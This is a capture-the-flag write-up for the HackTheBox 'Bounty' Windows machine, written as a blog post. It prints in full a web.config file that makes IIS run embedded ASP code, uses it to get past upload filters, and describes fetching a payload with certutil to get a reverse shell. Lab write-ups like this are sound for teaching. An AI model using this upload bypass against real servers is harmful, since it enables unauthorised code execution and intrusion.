---
title: "Bounty"
date: 2024-07-28
draft: false
description: "HackTheBox Bounty writeup"
tags: ["hackthebox", "htb", "windows", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Bounty

## Overview

- **OS:** Windows
- **IP:** 10.10.10.93
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

modified web.config file that allows the upload of aspx files to upload a aspx reverse shell payload but shell is not stable.

## Enumeration

nmap scan

{{< figure src="Untitled 44.png" >}}

homepage

{{< figure src="Untitled 45.png" >}}

dirbusting results

{{< figure src="Untitled 46.png" >}}

transfer.aspx

{{< figure src="Untitled 47.png" >}}

## Vulnerabilities

transfer.aspx directory

asp through webconfig [https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Exploitation


lets see what all extensions we can upload to the server

first lets send the upload action to a repeater

{{< figure src="Untitled 48.png" >}}

now lets create our payload

{{< figure src="Untitled 49.png" >}}

let this be our extensions.txt file

{{< figure src="Untitled 50.png" >}}

we send the request to the intruder and then add our payload

{{< figure src="Untitled 51.png" >}}

here we define the payload

{{< figure src="Untitled 52.png" >}}

ok so with this we can tell that the server accepts uploads with these extensions

{{< figure src="Untitled 53.png" >}}

[https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

this config file allows us to upload asp files which could give us a shell so lets use this

`<?xml` `version="1.0"` `encoding="UTF-8"?>`

`<configuration>`

`<system.webServer>`

`<handlers` `accessPolicy="Read, Script, Write">`

`<add` `name="web_config"` `path="*.config"` `verb="*"` `modules="IsapiModule"` `scriptProcessor="%windir%\system32\inetsrv\asp.dll"` `resourceType="Unspecified"` `requireAccess="Write"` `preCondition="bitness64"` `/>`

`</handlers>`

`<security>`

`<requestFiltering>`

`<fileExtensions>`

`<remove` `fileExtension=".config"` `/>`

`</fileExtensions>`

`<hiddenSegments>`

`<remove` `segment="web.config"` `/>`

`</hiddenSegments>`

`</requestFiltering>`

`</security>`

`</system.webServer>`

`</configuration>`

`<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!`

`<%`

`Response.write("-"&"->")`

`' it is running the ASP code if you can see 3 by opening the web.config file!`

`Response.write(1+2)`

`Response.write("<!-"&"-")`

`%>`

- `->`

now lets upload this file on the server

{{< figure src="Untitled 54.png" >}}

{{< figure src="Untitled 55.png" >}}

its displaying 3 , that means our web.config file is working properly

now we can go ahead and try getting a shell

{{< figure src="Untitled 56.png" >}}

alright we have made our payload , now time to get it running on the victims box

setting up our python server nd netcat

{{< figure src="Untitled 57.png" >}}

we will now use certutil to get the exe payload 

{{< figure src="Untitled 58.png" >}}

and on uploading then refreshing the uploadedfiles/webconfig dir

we have our shell

{{< figure src="Untitled 59.png" >}}
